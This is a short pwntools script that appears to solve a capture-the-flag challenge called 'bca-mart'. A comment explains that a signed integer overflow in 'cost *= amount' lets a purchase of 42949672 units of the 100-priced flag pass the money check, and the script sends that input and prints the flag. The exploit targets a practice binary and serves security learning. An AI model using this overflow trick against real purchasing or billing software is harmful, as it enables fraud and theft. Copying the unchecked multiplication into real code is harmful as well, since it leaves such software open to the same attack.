from pwn import *

#p = remote('bin.bcactf.com', 49153)
p = process('./bca-mart')

e = ELF('./bca-mart')

## Read until the prompt
p.readuntil('> ')

## The bug is at with the line:
'''
   cost *= amount;
   ...
   if (cost <= money) {
   ...

   Since the cost variable is a signed int you can cause an integer overflow when cost is multiplied times the amount.
   An int is 4 bytes so I just took 0xffffffff/100 = 42949672. The 100 is the price of the flag. The result tells me
   how much that I need to purchase to cause an integer overflow. 
'''
p.send('6\n')

p.readuntil('> ')

p.send('42949672\n')
p.readline()
p.readline()
flag = p.readline()

print('Flag: ', flag)

p.close()

